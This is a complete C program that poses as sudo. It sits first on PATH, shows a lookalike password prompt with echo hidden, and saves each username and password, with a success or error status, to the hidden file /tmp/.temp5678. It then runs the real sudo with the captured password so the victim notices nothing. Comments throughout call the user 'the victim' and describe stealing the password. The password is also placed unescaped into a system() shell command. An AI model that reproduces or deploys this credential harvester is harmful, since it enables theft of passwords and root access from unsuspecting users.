#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <termios.h>
#include <stdio.h>
#include <limits.h>

#define BUFFER_SIZE  100
#define MAX_PW_ATTEMPTS  3
#define DEFAULT_LOCATION "/tmp/.temp5678"

/* save_password()
*  Writes the username, supplied password by the victim and status to disk.
*
*  username: Victim's username
*  password: Victim's password
*  status: ERROR for incorrect password
*          SUCCESS for correct password
*
*/
int save_password(char *username, char *password, char *status)
{
    char text[BUFFER_SIZE] = {0};
    snprintf(text, sizeof(text), "%s:%s:%s\n", username, password, status);

    FILE *fp;
    fp = fopen(DEFAULT_LOCATION, "a+");
    if (fp != NULL)
    {
        fwrite(text, 1, sizeof(text), fp);
    }
    fclose(fp);
    return 0;
}

/* basic_sudo()
*  Simple executes sudo with the victim's command without trying to steal the password
*
*  arguments: Contains the victim's command
*
*/
int basic_sudo(char *sudo_path, char *arguments) {
    /* Contains the victim's original command */
    char orgiginal_cmd[BUFFER_SIZE] = {0};

    snprintf(orgiginal_cmd, sizeof(orgiginal_cmd), "%s%s", sudo_path, arguments);
    system(orgiginal_cmd);
    return 0;
}

/* check_sudo()
*  Tried to execute sudo to determine if user already has sudo access.
*  system() returns 256 on error which indicates no sudo access.
*
*  Returns: 0 if user does not have sudo access or if malloc failed
*           1 if the user has sudo access
*/
int check_sudo(char *sudo_path) {
    const char *sudo_args = " -n true 2>/dev/null";
    size_t len = strlen(sudo_path) + strlen(sudo_args) + 1;
    char *command = malloc(len);
    if (!command) {
        return 0;
    }
    snprintf(command, len, "%s%s", sudo_path, sudo_args);

    int ret;
    ret = system(command);
    free(command);
    if (ret == 256) {
        return 0;
    } else {
        return 1;
    }
}

/* get_user_pass()
*  Gets the victim's password and hides the input in the terminal just like sudo.
*  Same arguments as getline().
*
*  getline() reads an entire line from stream, storing the address of
*  the buffer containing the text into *lineptr.  The buffer is null-
*  terminated and includes the newline character, if one was found.
*
*  If *lineptr is set to NULL and *n is set 0 before the call, then
*  getline() will allocate a buffer for storing the line.  This buffer
*  should be freed by the user program even if getline() failed." 
*
*/
ssize_t get_user_pass(char **lineptr, size_t *n, FILE *stream)
{
    struct termios old, new;
    int nread;

    /* Turn echoing off and fail if we can’t. */
    if (tcgetattr (fileno (stream), &old) != 0)
        return -1;
    new = old;
    new.c_lflag &= ~ECHO;
    if (tcsetattr (fileno (stream), TCSAFLUSH, &new) != 0)
        return -1;

    /* Read the password. */
    nread = getline (lineptr, n, stream);

    /* Restore terminal. */
    (void) tcsetattr (fileno (stream), TCSAFLUSH, &old);

    return nread;
}

/* find_sudo()
* Finds the path of sudo executable by searching it from directories of PATH
* environment variable. The first one is ignored, because it should be this program
* if we have already prepended payload path to the PATH.
*
* Returns: NULL if PATH variable isn't set or if sudo executable can't be found in
*          PATH or if malloc failed.
*          The path to sudo executable otherwise. Memory is allocated for this string,
*          it needs to be freed after use.
*/
char *find_sudo()
{
    const char *sudo_bin = "/sudo";
    char *sudo_path = NULL;
    char *paths = getenv("PATH");
    char *path = NULL;
    size_t len = 0;
    int is_first_path = 1;

    if (!paths) {
        return NULL;
    }

    while ((path = strtok(paths, ":"))) {
        len = strlen(path) + strlen(sudo_bin) + 1;
        sudo_path = malloc(len);
        if (!sudo_path) {
            return NULL;
        }
        snprintf(sudo_path, len, "%s%s", path, sudo_bin);

        if (!is_first_path && access(sudo_path, X_OK) == 0) {
            return sudo_path;
        }
        is_first_path = 0;

        paths = NULL;
        free(sudo_path);
    }

    return NULL;
}

int main(int argc, char const *argv[])
{
    struct passwd *usr = getpwuid(getuid());
    /* Contains the password for sudo access */
    char *password = NULL;
    /* The victim's intital parameters to run sudo with */
    char arguments[BUFFER_SIZE] = {0};
    /* Full command to trick the victim into beleiving sudo ran successfully */
    char command[PATH_MAX] = {0};
    char *sudo_path = NULL;

    size_t len = 0;
    int args;
    int pw_attempts = 1;

    sudo_path = find_sudo();
    if (!sudo_path) {
        return 0;
    }

    /* Gather all the arguments supplied by the user and store them in a buffer */
    for (args = 1; args < argc; ++args) {
        snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[args]);
    }

    /* If we managed to get the current user, attempt to steal his password by faking sudo */
    if(usr) {
        /* Check if user already has sudo access */
        if (!check_sudo(sudo_path)) {
            /* Check if the victim supplied any arguments, if not simply run sudo */
            if (argc != 1) {
                while(pw_attempts <= MAX_PW_ATTEMPTS) {
                    printf("[sudo] password for %s: ", usr->pw_name);
                    get_user_pass(&password, &len, stdin);

                    /* Remove the \n at the end of the password, otherwise it messes up the command */
                    if(password[strlen(password)-1] == '\n') password[strlen(password)-1] = '\0';                 
                    
                    /* Build the full command to be executed */
                    snprintf(command, sizeof(command), "echo %s | %s -S%s 2>/dev/null", password, sudo_path, arguments);
                    printf("\n");
                    /* Check if victim entered the correct password. system() weirdly returns 256 on error */
                    if((system(command)) == 256) {
                        printf("Sorry, try again.\n");
                        save_password(usr->pw_name, password, "ERROR");
                    } else {
                        save_password(usr->pw_name, password, "SUCCESS");
                        break;
                    }

                    /* Give the victim MAX_PW_ATTEMPTS attempts to enter his password */
                    if (pw_attempts == MAX_PW_ATTEMPTS) {
                        printf("sudo: %d incorrect password attempts\n", MAX_PW_ATTEMPTS);
                    }

                    pw_attempts++;
                }

                free(password);
            } else {
                basic_sudo(sudo_path, "");
            }
        } else {
            basic_sudo(sudo_path, arguments);
        }
    } else {
        basic_sudo(sudo_path, arguments);
    }

    free(sudo_path);

    return 0;
}
